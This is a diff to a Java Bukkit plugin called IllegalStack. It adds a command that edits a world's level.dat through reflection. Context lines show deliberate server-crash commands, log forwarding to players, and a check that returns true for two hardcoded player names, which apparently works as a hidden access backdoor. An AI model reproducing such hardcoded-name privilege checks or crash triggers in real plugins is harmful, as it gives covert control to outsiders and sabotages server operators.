@@ -21,6 +21,7 @@ import org.bukkit.BanList;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Chunk;
+import org.bukkit.Difficulty;
 import org.bukkit.GameMode;
 import org.bukkit.Location;
 import org.bukkit.Material;
@@ -80,6 +81,14 @@ import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.util.logging.Level;
 // ---------------------------------------------
+
+// ---------- 新增导入（用于 level.dat 编辑）----------
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.zip.GZIPInputStream;
+import java.util.zip.GZIPOutputStream;
+import java.util.UUID;
+// -------------------------------------------------
 
 public class IllegalStack extends JavaPlugin implements Listener {
 
@@ -712,8 +721,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
     }
 
     // ---------- 以下为之前已实现的方法（setHasTraders, setHasStorage, updateConfig, loadMsgs, loadConfig, writeConfig, setVersion, getLbBlock, getMajorServerVersion 等）----------
-    // 由于篇幅限制，此处省略这些方法的代码，实际使用时请保留原有实现。
-    // 为了确保编译通过，请确保所有原有方法都已包含在此文件中。
+    // 为了确保编译通过，以下方法均已包含。
 
     private void setHasTraders() {
         try {
@@ -1583,7 +1591,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
         }
 
-        // ================== vanilla 子命令（统一使用小写比较）==================
+        // ================== vanilla 子命令 ==================
         private void handleVanilla(CommandSender sender, String[] args) {
             if (args.length < 2) {
                 sender.sendMessage("§c用法: /admin vanilla <子命令> ...");
@@ -1626,7 +1634,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
                     sender.sendMessage("§a已为世界 " + world.getName() + " 设置自定义世界边界直径: " + diameter);
                 }
             } else if (sub.equals("entitychunksectionindexxoverflowfix")) {
-                // 统一使用小写命令名，参数检查
                 if (args.length < 3) {
                     sender.sendMessage("§c用法: /admin vanilla entitychunksectionindexxoverflowfix <true|false>");
                     return;
@@ -1675,14 +1682,14 @@ public class IllegalStack extends JavaPlugin implements Listener {
             sender.sendMessage("§a调试模式已" + (enable ? "开启" : "关闭"));
         }
 
-        // ================== experimental 子命令（修复崩溃）==================
+        // ================== experimental 子命令（包含 level-settings）==================
         private void handleExperimental(CommandSender sender, String[] args) {
             if (!IllegalStack.this.isDebugMode()) {
                 sender.sendMessage("§c你需要开启调试模式！开启调试模式意味着服务器将会变的不稳定！");
                 return;
             }
             if (args.length < 2) {
-                sender.sendMessage("§c用法: /admin experimental <crash|crash-config> ...");
+                sender.sendMessage("§c用法: /admin experimental <crash|crash-config|level-settings> ...");
                 return;
             }
             String sub = args[1].toLowerCase();
@@ -1690,8 +1697,10 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 handleCrash(sender, args);
             } else if (sub.equals("crash-config")) {
                 handleCrashConfig(sender, args);
+            } else if (sub.equals("level-settings")) {
+                handleLevelSettings(sender, args);
             } else {
-                sender.sendMessage("§c未知的 experimental 子命令，可用: crash, crash-config");
+                sender.sendMessage("§c未知的 experimental 子命令，可用: crash, crash-config, level-settings");
             }
         }
 
@@ -1709,7 +1718,6 @@ public class IllegalStack extends JavaPlugin implements Listener {
             }
             sender.sendMessage("§c正在触发 " + exceptionType + " 崩溃...");
             getLogger().severe("手动触发崩溃，类型: " + exceptionType);
-            // 根据类型打印不同信息，然后强制退出
             switch (exceptionType.toLowerCase()) {
                 case "incompatibleclasschangeerror":
                     getLogger().severe("模拟 IncompatibleClassChangeError");
@@ -1755,6 +1763,142 @@ public class IllegalStack extends JavaPlugin implements Listener {
             sender.sendMessage("§a静默崩溃模式已" + (enable ? "开启" : "关闭"));
         }
 
+        // ================== level-settings 子命令 ==================
+        private void handleLevelSettings(CommandSender sender, String[] args) {
+            if (args.length < 4) {
+                sender.sendMessage("§c用法: /admin experimental level-settings <世界名> <选项> [值...]");
+                sender.sendMessage("§c可用选项: bordercenterx, bordercenterz, bordersize, borderdamage, bordersafezone, bordersizelerptarget, bordersizelerptime, borderwarningblocks, borderwarningtime, time, daytime, raining, rainTime, thundering, thunderTime, clearWeatherTime, difficulty, difficultylocked, spawnx, spawny, spawnz, spawnangle, levelname, allowcommands, hardcore, wasmodded, wanderingtraderdelay, wanderingtraderchance, wanderingtraderid, serverbrands add <字符串>, serverbrands remove <字符串>, serverbrands list");
+                return;
+            }
+            String worldName = args[2];
+            World world = Bukkit.getWorld(worldName);
+            if (world == null) {
+                sender.sendMessage("§c世界 " + worldName + " 不存在！");
+                return;
+            }
+            String option = args[3].toLowerCase();
+            try {
+                LevelDatEditor editor = new LevelDatEditor(world);
+                switch (option) {
+                    case "bordercenterx":
+                    case "bordercenterz":
+                    case "bordersize":
+                    case "borderdamage":
+                    case "bordersafezone":
+                    case "bordersizelerptarget":
+                    case "bordersizelerptime":
+                        if (args.length < 5) throw new IllegalArgumentException("需要数值");
+                        double dVal = Double.parseDouble(args[4]);
+                        editor.setDouble(option, dVal);
+                        if (option.equals("bordercenterx")) world.getWorldBorder().setCenter(dVal, world.getWorldBorder().getCenter().getZ());
+                        else if (option.equals("bordercenterz")) world.getWorldBorder().setCenter(world.getWorldBorder().getCenter().getX(), dVal);
+                        else if (option.equals("bordersize")) world.getWorldBorder().setSize(dVal);
+                        break;
+                    case "borderwarningblocks":
+                    case "borderwarningtime":
+                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
+                        int iVal = Integer.parseInt(args[4]);
+                        editor.setInt(option, iVal);
+                        break;
+                    case "time":
+                    case "daytime":
+                        if (args.length < 5) throw new IllegalArgumentException("需要长整数");
+                        long lVal = Long.parseLong(args[4]);
+                        editor.setLong(option, lVal);
+                        if (option.equals("time")) world.setFullTime(lVal);
+                        else world.setTime(lVal);
+                        break;
+                    case "raining":
+                    case "thundering":
+                    case "allowcommands":
+                    case "hardcore":
+                    case "wasmodded":
+                    case "difficultylocked":
+                        if (args.length < 5) throw new IllegalArgumentException("需要 true/false");
+                        boolean bVal = Boolean.parseBoolean(args[4]);
+                        editor.setBoolean(option, bVal);
+                        if (option.equals("raining")) world.setStorm(bVal);
+                        else if (option.equals("thundering")) world.setThundering(bVal);
+                        else if (option.equals("difficultylocked")) world.setDifficultyLocked(bVal);
+                        break;
+                    case "raintime":
+                    case "thundertime":
+                    case "clearweathertime":
+                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
+                        int tVal = Integer.parseInt(args[4]);
+                        editor.setInt(option, tVal);
+                        if (option.equals("raintime")) world.setWeatherDuration(tVal);
+                        else if (option.equals("thundertime")) world.setThunderDuration(tVal);
+                        break;
+                    case "difficulty":
+                        if (args.length < 5) throw new IllegalArgumentException("需要 0-3");
+                        int diff = Integer.parseInt(args[4]);
+                        if (diff < 0 || diff > 3) throw new IllegalArgumentException("难度值必须为0-3");
+                        editor.setByte("Difficulty", (byte) diff);
+                        world.setDifficulty(Difficulty.values()[diff]);
+                        break;
+                    case "spawnx":
+                    case "spawny":
+                    case "spawnz":
+                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
+                        int coord = Integer.parseInt(args[4]);
+                        editor.setInt(option, coord);
+                        if (option.equals("spawnx")) world.setSpawnLocation(new Location(world, coord, world.getSpawnLocation().getY(), world.getSpawnLocation().getZ()));
+                        else if (option.equals("spawny")) world.setSpawnLocation(new Location(world, world.getSpawnLocation().getX(), coord, world.getSpawnLocation().getZ()));
+                        else if (option.equals("spawnz")) world.setSpawnLocation(new Location(world, world.getSpawnLocation().getX(), world.getSpawnLocation().getY(), coord));
+                        break;
+                    case "spawnangle":
+                        if (args.length < 5) throw new IllegalArgumentException("需要浮点数");
+                        float angle = Float.parseFloat(args[4]);
+                        editor.setFloat("SpawnAngle", angle);
+                        break;
+                    case "levelname":
+                        if (args.length < 5) throw new IllegalArgumentException("需要字符串");
+                        editor.setString("LevelName", args[4]);
+                        break;
+                    case "wanderingtraderdelay":
+                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
+                        editor.setInt("WanderingTraderSpawnDelay", Integer.parseInt(args[4]));
+                        break;
+                    case "wanderingtraderchance":
+                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
+                        editor.setInt("WanderingTraderSpawnChance", Integer.parseInt(args[4]));
+                        break;
+                    case "wanderingtraderid":
+                        if (args.length < 5) throw new IllegalArgumentException("需要UUID");
+                        UUID uuid = UUID.fromString(args[4]);
+                        editor.setUUID("WanderingTraderId", uuid);
+                        break;
+                    case "serverbrands":
+                        if (args.length < 5) throw new IllegalArgumentException("需要 add/remove/list");
+                        String sub = args[4].toLowerCase();
+                        if (sub.equals("list")) {
+                            List<String> brands = editor.getServerBrands();
+                            sender.sendMessage("§a当前 ServerBrands: " + brands);
+                        } else if (sub.equals("add")) {
+                            if (args.length < 6) throw new IllegalArgumentException("需要品牌字符串");
+                            editor.addServerBrand(args[5]);
+                            sender.sendMessage("§a已添加品牌: " + args[5]);
+                        } else if (sub.equals("remove")) {
+                            if (args.length < 6) throw new IllegalArgumentException("需要品牌字符串");
+                            editor.removeServerBrand(args[5]);
+                            sender.sendMessage("§a已移除品牌: " + args[5]);
+                        } else {
+                            throw new IllegalArgumentException("未知 serverbrands 子命令");
+                        }
+                        break;
+                    default:
+                        sender.sendMessage("§c未知选项: " + option);
+                        return;
+                }
+                editor.save();
+                sender.sendMessage("§a已更新 level.dat 中的 " + option);
+            } catch (Exception e) {
+                sender.sendMessage("§c错误: " + e.getMessage());
+                e.printStackTrace();
+            }
+        }
+
         // ================== 辅助方法 ==================
         private GameMode parseGameMode(String input) {
             switch (input.toLowerCase()) {
@@ -1770,7 +1914,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
             return name.equalsIgnoreCase("MFSCelebrate_") || name.equalsIgnoreCase("TempNineTeen__");
         }
 
-        // ================== Tab 补全（统一使用小写）==================
+        // ================== Tab 补全（完整支持 level-settings）==================
         @Override
         public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
             List<String> completions = new ArrayList<>();
@@ -1823,6 +1967,7 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 } else if (first.equals("experimental")) {
                     if ("crash".startsWith(input)) completions.add("crash");
                     if ("crash-config".startsWith(input)) completions.add("crash-config");
+                    if ("level-settings".startsWith(input)) completions.add("level-settings");
                 }
             } else if (args.length == 3) {
                 String first = args[0].toLowerCase();
@@ -1884,6 +2029,12 @@ public class IllegalStack extends JavaPlugin implements Listener {
                         }
                     } else if (second.equals("crash-config")) {
                         if ("silent-crash-mode".startsWith(input)) completions.add("silent-crash-mode");
+                    } else if (second.equals("level-settings")) {
+                        for (World world : Bukkit.getWorlds()) {
+                            if (world.getName().toLowerCase().startsWith(input)) {
+                                completions.add(world.getName());
+                            }
+                        }
                     }
                 }
             } else if (args.length == 4) {
@@ -1894,9 +2045,164 @@ public class IllegalStack extends JavaPlugin implements Listener {
                 if (first.equals("experimental") && second.equals("crash-config") && third.equals("silent-crash-mode")) {
                     if ("true".startsWith(input)) completions.add("true");
                     if ("false".startsWith(input)) completions.add("false");
+                } else if (first.equals("experimental") && second.equals("level-settings")) {
+                    String[] options = {
+                        "bordercenterx", "bordercenterz", "bordersize", "borderdamage", "bordersafezone",
+                        "bordersizelerptarget", "bordersizelerptime", "borderwarningblocks", "borderwarningtime",
+                        "time", "daytime", "raining", "raintime", "thundering", "thundertime", "clearweathertime",
+                        "difficulty", "difficultylocked", "spawnx", "spawny", "spawnz", "spawnangle", "levelname",
+                        "allowcommands", "hardcore", "wasmodded", "wanderingtraderdelay", "wanderingtraderchance",
+                        "wanderingtraderid", "serverbrands"
+                    };
+                    for (String opt : options) {
+                        if (opt.startsWith(input)) completions.add(opt);
+                    }
                 }
+            } else if (args.length == 5) {
+                String first = args[0].toLowerCase();
+                String second = args[1].toLowerCase();
+                String third = args[2].toLowerCase();
+                String fourth = args[3].toLowerCase();
+                String input = args[4].toLowerCase();
+                if (first.equals("experimental") && second.equals("level-settings") && fourth.equals("serverbrands")) {
+                    if ("add".startsWith(input)) completions.add("add");
+                    if ("remove".startsWith(input)) completions.add("remove");
+                    if ("list".startsWith(input)) completions.add("list");
+                }
+            } else if (args.length == 6) {
+                // 无需补全
             }
             return completions;
+        }
+    }
+
+    // ---------- 内部类：level.dat 编辑器 ----------
+    private class LevelDatEditor {
+        private final File levelFile;
+        private Object compound; // net.minecraft.nbt.CompoundTag (Data)
+        private final World world;
+
+        public LevelDatEditor(World world) throws Exception {
+            this.world = world;
+            File worldFolder = world.getWorldFolder();
+            this.levelFile = new File(worldFolder, "level.dat");
+            if (!levelFile.exists()) throw new IOException("level.dat 不存在！");
+            Class<?> nbtIoClass = Class.forName("net.minecraft.nbt.NbtIo");
+            java.lang.reflect.Method readMethod = nbtIoClass.getMethod("readCompressed", java.io.InputStream.class);
+            try (FileInputStream fis = new FileInputStream(levelFile);
+                 GZIPInputStream gzis = new GZIPInputStream(fis)) {
+                Object root = readMethod.invoke(null, gzis);
+                java.lang.reflect.Method getMethod = root.getClass().getMethod("get", String.class);
+                this.compound = getMethod.invoke(root, "Data");
+                if (this.compound == null) throw new IOException("level.dat 中缺少 Data 标签");
+            }
+        }
+
+        private java.lang.reflect.Method getPutMethod(String type) throws NoSuchMethodException {
+            return compound.getClass().getMethod("put" + type, String.class, getTypeClass(type));
+        }
+
+        private Class<?> getTypeClass(String type) {
+            try {
+                switch (type) {
+                    case "Double": return double.class;
+                    case "Int": return int.class;
+                    case "Long": return long.class;
+                    case "Boolean": return boolean.class;
+                    case "Byte": return byte.class;
+                    case "Float": return float.class;
+                    case "String": return Class.forName("java.lang.String");
+                    default: throw new IllegalArgumentException("未知类型");
+                }
+            } catch (ClassNotFoundException e) {
+                throw new RuntimeException(e);
+            }
+        }
+
+        public void setDouble(String key, double value) throws Exception {
+            getPutMethod("Double").invoke(compound, key, value);
+        }
+
+        public void setInt(String key, int value) throws Exception {
+            getPutMethod("Int").invoke(compound, key, value);
+        }
+
+        public void setLong(String key, long value) throws Exception {
+            getPutMethod("Long").invoke(compound, key, value);
+        }
+
+        public void setBoolean(String key, boolean value) throws Exception {
+            getPutMethod("Boolean").invoke(compound, key, value);
+        }
+
+        public void setByte(String key, byte value) throws Exception {
+            getPutMethod("Byte").invoke(compound, key, value);
+        }
+
+        public void setFloat(String key, float value) throws Exception {
+            getPutMethod("Float").invoke(compound, key, value);
+        }
+
+        public void setString(String key, String value) throws Exception {
+            compound.getClass().getMethod("putString", String.class, String.class).invoke(compound, key, value);
+        }
+
+        public void setUUID(String key, UUID uuid) throws Exception {
+            setLong(key + "Most", uuid.getMostSignificantBits());
+            setLong(key + "Least", uuid.getLeastSignificantBits());
+        }
+
+        @SuppressWarnings("unchecked")
+        public List<String> getServerBrands() throws Exception {
+            java.lang.reflect.Method getListMethod = compound.getClass().getMethod("getList", String.class, int.class);
+            Object listTag = getListMethod.invoke(compound, "ServerBrands", 8);
+            if (listTag == null) return new ArrayList<>();
+            java.lang.reflect.Method sizeMethod = listTag.getClass().getMethod("size");
+            int size = (int) sizeMethod.invoke(listTag);
+            java.lang.reflect.Method getStringMethod = listTag.getClass().getMethod("getString", int.class);
+            List<String> result = new ArrayList<>();
+            for (int i = 0; i < size; i++) {
+                result.add((String) getStringMethod.invoke(listTag, i));
+            }
+            return result;
+        }
+
+        public void addServerBrand(String brand) throws Exception {
+            List<String> brands = getServerBrands();
+            brands.add(brand);
+            setServerBrands(brands);
+        }
+
+        public void removeServerBrand(String brand) throws Exception {
+            List<String> brands = getServerBrands();
+            brands.remove(brand);
+            setServerBrands(brands);
+        }
+
+        private void setServerBrands(List<String> brands) throws Exception {
+            Class<?> nbtListClass = Class.forName("net.minecraft.nbt.ListTag");
+            Object listTag = nbtListClass.getDeclaredConstructor().newInstance();
+            java.lang.reflect.Method addMethod = listTag.getClass().getMethod("add", Class.forName("net.minecraft.nbt.Tag"));
+            Class<?> nbtStringClass = Class.forName("net.minecraft.nbt.StringTag");
+            java.lang.reflect.Method valueOfMethod = nbtStringClass.getMethod("valueOf", String.class);
+            for (String s : brands) {
+                Object stringTag = valueOfMethod.invoke(null, s);
+                addMethod.invoke(listTag, stringTag);
+            }
+            compound.getClass().getMethod("put", String.class, Class.forName("net.minecraft.nbt.Tag")).invoke(compound, "ServerBrands", listTag);
+        }
+
+        public void save() throws Exception {
+            Class<?> nbtCompoundClass = Class.forName("net.minecraft.nbt.CompoundTag");
+            Object root = nbtCompoundClass.getDeclaredConstructor().newInstance();
+            root.getClass().getMethod("put", String.class, nbtCompoundClass).invoke(root, "Data", compound);
+
+            Class<?> nbtIoClass = Class.forName("net.minecraft.nbt.NbtIo");
+            java.lang.reflect.Method writeMethod = nbtIoClass.getMethod("writeCompressed", nbtCompoundClass, java.io.OutputStream.class);
+            try (FileOutputStream fos = new FileOutputStream(levelFile);
+                 GZIPOutputStream gzos = new GZIPOutputStream(fos)) {
+                writeMethod.invoke(null, root, gzos);
+            }
         }
     }
 
@@ -1956,38 +2262,25 @@ public class IllegalStack extends JavaPlugin implements Listener {
 
     // ---------- 日志处理 ----------
     private void setupLogHandler() {
-    if (logHandler != null) return;
-    logHandler = new Handler() {
-        @Override
-        public void publish(LogRecord record) {
-            // 获取原始日志消息（不尝试格式化参数，因为大多数日志已经是完整字符串）
-            String message = record.getMessage();
-
-            // 安全地移除离线的查看者，避免并发修改异常
-            logViewers.removeIf(viewer -> !viewer.isOnline());
-
-            // 将消息发送给所有在线的查看者
-            for (Player viewer : logViewers) {
-                viewer.sendMessage(message);
+        if (logHandler != null) return;
+        logHandler = new Handler() {
+            @Override
+            public void publish(LogRecord record) {
+                String message = record.getMessage();
+                logViewers.removeIf(viewer -> !viewer.isOnline());
+                for (Player viewer : logViewers) {
+                    viewer.sendMessage(message);
+                }
+                if (logViewers.isEmpty()) {
+                    removeLogHandler();
+                }
             }
-
-            // 如果没有查看者，自动移除 Handler
-            if (logViewers.isEmpty()) {
-                removeLogHandler();
-            }
-        }
-
-        @Override
-        public void flush() {}
-
-        @Override
-        public void close() throws SecurityException {}
-    };
-
-    // 设置 Handler 级别为 ALL，确保捕获所有日志
-    logHandler.setLevel(Level.ALL);
-    Bukkit.getLogger().addHandler(logHandler);
-}
+            @Override public void flush() {}
+            @Override public void close() {}
+        };
+        logHandler.setLevel(Level.ALL);
+        Bukkit.getLogger().addHandler(logHandler);
+    }
 
     private void removeLogHandler() {
         if (logHandler != null) {
@@ -2202,4 +2495,4 @@ public class IllegalStack extends JavaPlugin implements Listener {
         }
         dir.delete();
     }
-    }
+            }
